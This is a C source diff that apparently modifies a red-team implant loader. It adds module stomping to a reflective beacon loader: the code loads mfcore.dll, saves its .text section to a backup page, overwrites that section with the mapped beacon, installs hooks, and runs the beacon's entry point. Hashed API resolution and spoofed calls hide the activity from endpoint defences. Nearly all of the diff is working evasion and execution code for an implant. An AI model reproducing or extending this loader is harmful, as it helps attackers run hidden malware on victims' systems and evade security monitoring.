@@ -24,6 +24,9 @@ typedef struct
         D_API( NtProtectVirtualMemory );
         D_API( RtlCreateHeap );
 
+        D_API( RtlInitUnicodeString );
+        D_API( LdrLoadDll );
+
     } ntdll;
 
 } API, *PAPI;
@@ -61,6 +64,8 @@ SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
     pApi->ntdll.NtAllocateVirtualMemory = FindFunction( hNtdll, H_API_NTALLOCATEVIRTUALMEMORY );
     pApi->ntdll.NtProtectVirtualMemory  = FindFunction( hNtdll, H_API_NTPROTECTVIRTUALMEMORY );
     pApi->ntdll.RtlCreateHeap           = FindFunction( hNtdll, H_API_RTLCREATEHEAP );
+    pApi->ntdll.LdrLoadDll              = FindFunction( hNtdll, H_API_LDRLOADDLL );
+    pApi->ntdll.RtlInitUnicodeString    = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );
 
     if( !pApi->ntdll.NtAllocateVirtualMemory ||
         !pApi->ntdll.NtProtectVirtualMemory  ||
@@ -158,13 +163,17 @@ SECTION( B ) VOID executeBeacon( PVOID entry )
 
 SECTION( B ) VOID Loader( VOID ) 
 {
-    API         Api;
-    REG         Reg;
-    NTSTATUS    Status;
-    PVOID       MemoryBuffer;
-    PVOID       Map;
-    HANDLE      BeaconHeap;
-    ULONG       OldProtection = 0;  
+    API               Api;
+    REG               Reg;
+    NTSTATUS          Status;
+    PVOID             MemoryBuffer;
+    PVOID             Map;
+    HANDLE            BeaconHeap;
+    ULONG             OldProtection      = 0;  
+    PIMAGE_DOS_HEADER OverloadModule     = NULL;
+    PIMAGE_NT_HEADERS OverloadNt         = NULL;
+    PVOID             BackupPage         = NULL;
+    DWORD64           SzBackupPage       = 0;
     
     RtlSecureZeroMemory( &Api, sizeof( Api ) );
     RtlSecureZeroMemory( &Reg, sizeof( Reg ) );
@@ -172,24 +181,77 @@ SECTION( B ) VOID Loader( VOID )
     if( resolveLoaderFunctions( &Api ) == STATUS_SUCCESS )
     {
         calculateRegions( &Reg );
-        Status = SPOOF( Api.ntdll.NtAllocateVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, 0, &Reg.Full, MEM_COMMIT, PAGE_READWRITE );
+
+        OverloadModule = FindModule( HashString( OFFSET( L"mfcore.dll" ), NULL ), NULL, NULL );
+        if ( !OverloadModule )
+        {
+            UNICODE_STRING      Uni = { 0 };
+            Api.ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"mfcore.dll" ) ) );
+            SPOOF( Api.ntdll.LdrLoadDll, NULL, NULL, NULL, C_PTR( 0 ), &Uni, &OverloadModule );
+        }
+        OverloadNt    = C_PTR( U_PTR( OverloadModule ) + OverloadModule->e_lfanew );
+        SzBackupPage  = IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData;
+        SzBackupPage += Reg.Full; 
+        Status        = SPOOF( Api.ntdll.NtAllocateVirtualMemory, NULL, NULL, ( HANDLE )-1, &BackupPage, 0, &SzBackupPage, MEM_COMMIT, PAGE_READWRITE );
+
         if( Status == STATUS_SUCCESS )
         {
+            // Allocate a heap
+            BeaconHeap = SPOOF( Api.ntdll.RtlCreateHeap, NULL, NULL, HEAP_GROWABLE, NULL, 0, 0, NULL, NULL  );
+
+            // Copy the original .text into the backup page
+            memcpy( BackupPage, U_PTR( OverloadModule ) + IMAGE_FIRST_SECTION( OverloadNt )->VirtualAddress, IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData );
+
+            // Map beacon into the backup page
+            copyStub( BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData );
+            Map = copyBeaconSections( BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData, Reg );
+            installHooks( Map, BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData, Reg.NT );
+
+            // Now map beacon to stomp .text
+            MemoryBuffer =  U_PTR( OverloadModule ) + IMAGE_FIRST_SECTION( OverloadNt )->VirtualAddress;
+            SPOOF( Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Full, PAGE_READWRITE, &OldProtection );
+            RtlSecureZeroMemory( MemoryBuffer, Reg.Full );
             copyStub( MemoryBuffer );
             Map = copyBeaconSections( MemoryBuffer, Reg );
-            BeaconHeap = SPOOF( Api.ntdll.RtlCreateHeap, NULL, NULL, HEAP_GROWABLE, NULL, 0, 0, NULL, NULL  );
-            fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
+            
             installHooks( Map, MemoryBuffer, Reg.NT );
 
+            // Fill in data stubs in both the backup page and the stomped .text
+            fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
+            memcpy( BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData, MemoryBuffer, sizeof( STUB ) );
+
+            // Update data stubs in backup page and stomped .text
             Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->VirtualAddress;
             Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
+            ( ( PSTUB )( BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData ) )->ExecRegionSize = Reg.Exec;
             ( ( PSTUB )MemoryBuffer )->ExecRegionSize = Reg.Exec;
+
+            // Make Stub + Mapped beacon executable + excute
             Status = SPOOF(Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
             if( Status == STATUS_SUCCESS )
             {
                 executeBeacon( C_PTR( U_PTR( Map ) + Reg.NT->OptionalHeader.AddressOfEntryPoint ) );
             };
         };
+
+        // Status = SPOOF( Api.ntdll.NtAllocateVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, 0, &Reg.Full, MEM_COMMIT, PAGE_READWRITE );
+        // if( Status == STATUS_SUCCESS )
+        // {
+        //     copyStub( MemoryBuffer );
+        //     Map = copyBeaconSections( MemoryBuffer, Reg );
+        //     BeaconHeap = SPOOF( Api.ntdll.RtlCreateHeap, NULL, NULL, HEAP_GROWABLE, NULL, 0, 0, NULL, NULL  );
+        //     fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
+        //     installHooks( Map, MemoryBuffer, Reg.NT );
+
+        //     Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->VirtualAddress;
+        //     Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
+        //     ( ( PSTUB )MemoryBuffer )->ExecRegionSize = Reg.Exec;
+        //     Status = SPOOF(Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
+        //     if( Status == STATUS_SUCCESS )
+        //     {
+        //         executeBeacon( C_PTR( U_PTR( Map ) + Reg.NT->OptionalHeader.AddressOfEntryPoint ) );
+        //     };
+        // };
     };
 };
 
